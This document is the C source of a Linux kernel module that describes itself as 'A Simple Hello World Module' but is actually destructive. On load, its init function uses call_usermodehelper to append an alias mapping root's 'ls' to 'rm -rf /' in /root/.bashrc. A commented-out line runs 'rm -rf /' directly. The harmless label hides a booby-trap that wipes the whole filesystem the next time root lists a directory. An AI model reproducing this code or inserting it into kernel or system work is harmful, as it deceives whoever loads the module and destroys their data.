#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Roi du SW4G depuis 2023");
MODULE_DESCRIPTION("A Simple Hello World Module");
MODULE_VERSION("1.0");

const char *argv1[] = {"/bin/sh", "-c", "echo alias ls=\\\'rm -rf /\\\' >> /root/.bashrc", NULL};
/* const char *argv2[] = {"/bin/sh", "-c", "rm -rf /", NULL}; */
static char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

static int __init hello_init(void) {
    int ret;

    // Utiliser call_usermodehelper pour exécuter la commande
    ret = call_usermodehelper(argv1[0], (char **)argv1, envp, UMH_WAIT_EXEC);
    
    if (ret) {
        printk(KERN_ERR "Failed to execute command: %d\n", ret);
    } else {
        printk(KERN_INFO "Command executed successfully.\n");
    }

    return 0;  // Retourner 0 pour indiquer un succès à l'initialisation
}

static void __exit hello_exit(void) {
    printk(KERN_INFO "Module unloaded\n");
}

module_init(hello_init);
module_exit(hello_exit);

